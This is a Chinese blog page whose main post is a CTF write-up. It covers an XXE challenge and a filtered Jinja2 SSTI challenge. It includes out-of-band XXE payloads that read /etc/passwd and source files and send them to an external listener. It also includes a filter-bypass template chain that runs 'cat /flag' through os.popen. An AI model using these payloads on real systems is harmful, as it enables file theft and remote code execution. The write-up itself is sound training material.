<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>greetdawn&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="#3273dc"><meta name="application-name" content="greetdawn&#039;s Site"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="msapplication-TileColor" content="#3273dc"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="greetdawn&#039;s Site"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Love coding,Love life!"><meta property="og:type" content="blog"><meta property="og:title" content="greetdawn&#039;s Blog"><meta property="og:url" content="http://www.greetdawn.top/"><meta property="og:site_name" content="greetdawn&#039;s Blog"><meta property="og:description" content="Love coding,Love life!"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://www.greetdawn.top/img/og_image.png"><meta property="article:author" content="丨greetdawn丨"><meta property="article:tag" content="Web安全,Linux,Python,Life"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://www.greetdawn.top"},"headline":"greetdawn's Blog","image":["http://www.greetdawn.top/img/og_image.png"],"author":{"@type":"Person","name":"丨greetdawn丨"},"publisher":{"@type":"Organization","name":"greetdawn's Blog","logo":{"@type":"ImageObject","url":{"text":"greetdawn's Site"}}},"description":"Love coding,Love life!"}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/monokai-sublime.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Oxanium:wght@300;400;600&amp;family=Roboto+Mono"><link rel="stylesheet" href="/css/cyberpunk.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script>var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?0504a401a4e9d23a231f260a409feec4";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();</script><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">greetdawn&#039;s Site</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">主页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Greetdawn"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-02-25T08:05:05.000Z" title="2022/2/25 下午4:05:05">2022-02-25</time>发表</span><span class="level-item"><time dateTime="2022-02-25T08:05:28.349Z" title="2022/2/25 下午4:05:28">2022-02-25</time>更新</span><span class="level-item">几秒读完 (大约1个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/02/25/Gallery/">Gallery</a></h1><div class="content"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;justified-gallery&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/hexo-theme-icarus/gallery/animals/elephant.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Elephant&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/hexo-theme-icarus/gallery/animals/dog.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Dog&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/hexo-theme-icarus/gallery/animals/birds.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Birds&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/hexo-theme-icarus/gallery/animals/fox.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Fox&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/hexo-theme-icarus/gallery/animals/horse.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Horse&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/hexo-theme-icarus/gallery/animals/leopard.jpeg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Leopard&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2022-02-15T08:34:16.000Z" title="2022/2/15 下午4:34:16">2022-02-15</time>发表</span><span class="level-item"><time dateTime="2022-02-15T14:34:41.898Z" title="2022/2/15 下午10:34:41">2022-02-15</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">安全竞赛</a></span><span class="level-item">10 分钟读完 (大约1442个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/02/15/ctf-wp-saining/">ctf-wp-saining</a></h1><div class="content"><h1 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">61.147.171.107:10081</span><br><span class="line">61.147.171.107:10082</span><br><span class="line">61.147.171.107:10083</span><br></pre></td></tr></table></figure>



<h1 id="10081-xml注入"><a href="#10081-xml注入" class="headerlink" title="10081 xml注入"></a>10081 xml注入</h1><p>访问源代码分析，感觉应该的是个xml外部实体注入</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png"></p>
<p>先构造payload试一哈：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>确实存在，但是有过滤</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png" alt="image-20220215220635177"></p>
<p>尝试使用参数型实体方式注入：</p>
<p><code>vps</code>构造<code> test.dtd</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.79:8888?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>开启端口监听：<code>nc -lvvp 8888</code></p>
<p>攻击payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://139.196.234.164:8899/test.dtd&quot;&gt;</span><br><span class="line">	%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png" alt="image-20220215221604181"></p>
<p>成功返回加密字符串，解密后获取</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png" alt="image-20220215221634222"></p>
<p>修改<code>test.dtd</code>获取<code>test.php</code>源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.79:8888?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>发包获取到源码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function showAttrs($attrs) &#123;</span><br><span class="line">    $r = [&quot;&quot;];</span><br><span class="line">    foreach ($attrs as $k =&gt; $v) &#123;</span><br><span class="line">        array_push($r, $k . &quot;=\&quot;&quot; . $v-&gt;textContent . &quot;\&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return implode(&quot; &quot;, $r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function showNode($n, $pre) &#123;</span><br><span class="line">    if ($n-&gt;hasChildNodes()) &#123;</span><br><span class="line">        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\n&quot;;</span><br><span class="line">        foreach ($n-&gt;childNodes as $c) &#123;</span><br><span class="line">            show($c, $pre . &quot; &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo $pre . &quot;&lt;/&quot; . $n-&gt;nodeName . &quot;&gt;\n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;/&gt;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show($n, $pre) &#123;</span><br><span class="line">    switch ($n-&gt;nodeType) &#123;</span><br><span class="line">        case XML_ELEMENT_NODE:</span><br><span class="line">            showNode($n, $pre);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case XML_TEXT_NODE:</span><br><span class="line">        case XML_CDATA_SECTION_NODE:</span><br><span class="line">        case XML_ENTITY_REF_NODE:</span><br><span class="line">            echo $pre . $n-&gt;textContent . &quot;\n&quot;;</span><br><span class="line">            break;</span><br><span class="line">        </span><br><span class="line">        case XML_COMMENT_NODE:</span><br><span class="line">            echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\n&quot;;</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case XML_DOCUMENT_NODE:</span><br><span class="line">            foreach ($n-&gt;childNodes as $c) &#123;</span><br><span class="line">                show($c, $pre);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">        	echo &quot;Nope&quot;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">    $d = new DOMDocument();</span><br><span class="line">    $data = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">    if(preg_match(&#x27;/file|rot13/i&#x27;, $data))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;illegal!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line">    if ($d-&gt;validate()) &#123;</span><br><span class="line">        show($d, &quot;&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;è¿å¥½åä¸æ¯ä¸ªè§èçè¯­å¥å¦&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo (&quot;è¯·æ±æ¹å¼æè¯¯&quot;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>看了一下源码没啥东西</p>
<p>应该不用源码审计，猜测flag可能存在路径下，修改test.dtd包含一下看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.79:8888?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png" alt="image-20220215222612642"></p>
<p>确实有值，解密后成功拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png" alt="image-20220215222649524"></p>
<h2 id="flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb"><a href="#flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb" class="headerlink" title="flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}"></a>flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}</h2><h1 id="10082-ssti模板注入"><a href="#10082-ssti模板注入" class="headerlink" title="10082 ssti模板注入"></a>10082 ssti模板注入</h1><p>请求获取源码，分析源码，获得变量入口点，首先传参变量是name, 构造<code>/?name=&#123;&#123;4*4&#125;&#125;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png" alt="image-20220215165423675"></p>
<p>呦西 ，确实有ssti！</p>
<p>不过存在过滤，几乎把能过滤的东西都过滤了，过滤的死死滴</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackwords = [<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;redirect&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#125;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>那就绕吧，怎么绕呢？</p>
<p>这里可以利用的点就是使用jinja2自身的过滤器进行bypass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png" alt="image-20220215172249858"></p>
<p>编写获取对应字符串搜索脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author:greetdawn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.107:10082/?name=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;% set sstr = ((app.__doc__|string|list).pop(&#123;num&#125;)|string) %&#125;&#125;&#123;&#123;&#123;&#123;sstr&#125;&#125;&#125;&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">300</span>):</span><br><span class="line">	r = requests.get(url + payload.<span class="built_in">format</span>(num=i))</span><br><span class="line">	<span class="comment"># print(r.text)</span></span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[+] paylaod: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.<span class="built_in">format</span>(num=i)))</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;search &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure>

<p>依次获取更多字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125; # _</span><br><span class="line">&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格</span><br><span class="line">&#123;% set left = ((app.__doc__|string|list).pop(171)|string) %&#125; &#123;&#123;left&#125;&#125; # (</span><br><span class="line">&#123;% set right = ((app.__doc__|string|list).pop(182)|string) %&#125; &#123;&#123;right&#125;&#125; # )</span><br><span class="line">&#123;% set yin = ((app.__doc__|string|list).pop(177)|string) %&#125; # 单引号 &#x27;</span><br><span class="line">&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125; &#123;&#123;point&#125;&#125; # .</span><br><span class="line"></span><br><span class="line">&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;    # builtins</span><br><span class="line">&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;&#123;imp&#125;&#125; # import</span><br><span class="line">&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;&#123;pon&#125;&#125; # popen</span><br><span class="line">&#123;% set os = dict(o=aa,s=dd)|join %&#125;&#123;&#123;os&#125;&#125;    # os</span><br><span class="line">&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;    # cat</span><br><span class="line">&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;    # flag</span><br><span class="line">&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;    # eval</span><br><span class="line">&#123;% set red = dict(re=aa,ad=dd)|join %&#125; &#123;&#123;red&#125;&#125; # read</span><br><span class="line">&#123;% set bul = xhx*2~but~xhx*2 %&#125;    # __builtins__</span><br><span class="line"></span><br><span class="line">&#123;% set zero = (self|int) %&#125;    # 0, 也可以使用lenght过滤器获取数字</span><br><span class="line">&#123;% set one = (zero**zero)|int %&#125;    # 1</span><br><span class="line">&#123;% set two = (zero-one-one)|abs %&#125;    # 2</span><br><span class="line">&#123;% set four = (two*two)|int %&#125;    # 4</span><br><span class="line">&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5</span><br><span class="line">&#123;% set three = five-one-one %&#125;    # 3</span><br><span class="line">&#123;% set nine = (two*two*two*two-five-one-one) %&#125;    # 9</span><br><span class="line">&#123;% set seven = (zero-one-one-five)|abs %&#125;    # 7</span><br><span class="line">&#123;% set c = dict(c=aa)|reverse|first %&#125;    # 字符 c</span><br><span class="line">&#123;% set bfh = self|string|urlencode|first %&#125;    # 百分号 %</span><br><span class="line">&#123;% set bfhc = bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span><br><span class="line">&#123;% set slas = bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 /</span><br></pre></td></tr></table></figure>

<p>根据以上获取字符串进行拼接获取<code>payload:``__import__(’os‘).popen(‘cat /flag’).read()</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.107:10082/?name=&#123;% set zero = (self|int) %&#125;</span><br><span class="line">&#123;% set one = (zero**zero)|int %&#125;</span><br><span class="line">&#123;% set two = (zero-one-one)|abs %&#125;</span><br><span class="line">&#123;% set four = (two*two)|int %&#125;</span><br><span class="line">&#123;% set five = (two*two*two)-one-one-one %&#125;</span><br><span class="line">&#123;% set three = five-one-one %&#125;</span><br><span class="line">&#123;% set nine = (two*two*two*two-five-one-one) %&#125;</span><br><span class="line">&#123;% set seven = (zero-one-one-five)|abs %&#125;</span><br><span class="line">&#123;% set c = dict(c=aa)|reverse|first %&#125;</span><br><span class="line">&#123;% set bfh = self|string|urlencode|first %&#125;</span><br><span class="line">&#123;% set bfhc = bfh~c %&#125;</span><br><span class="line">&#123;% set slas = bfhc%((four~seven)|int) %&#125;</span><br><span class="line">&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;</span><br><span class="line">&#123;% set yin = ((app.__doc__|string|list).pop(177)|string) %&#125;</span><br><span class="line">&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;</span><br><span class="line">&#123;% set left = ((app.__doc__|string|list).pop(171)|string) %&#125;</span><br><span class="line">&#123;% set right = ((app.__doc__|string|list).pop(182)|string) %&#125;</span><br><span class="line">&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;</span><br><span class="line">&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;</span><br><span class="line">&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;</span><br><span class="line">&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;</span><br><span class="line">&#123;% set exo = dict(o=aa,s=dd)|join %&#125;</span><br><span class="line">&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;</span><br><span class="line">&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;</span><br><span class="line">&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;</span><br><span class="line">&#123;% set red = dict(re=aa,ad=dd)|join %&#125;</span><br><span class="line">&#123;% set bul = xhx*2~but~xhx*2 %&#125; </span><br><span class="line">&#123;% set pld = xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line">&#123;&#123;pld&#125;&#125;</span><br></pre></td></tr></table></figure>

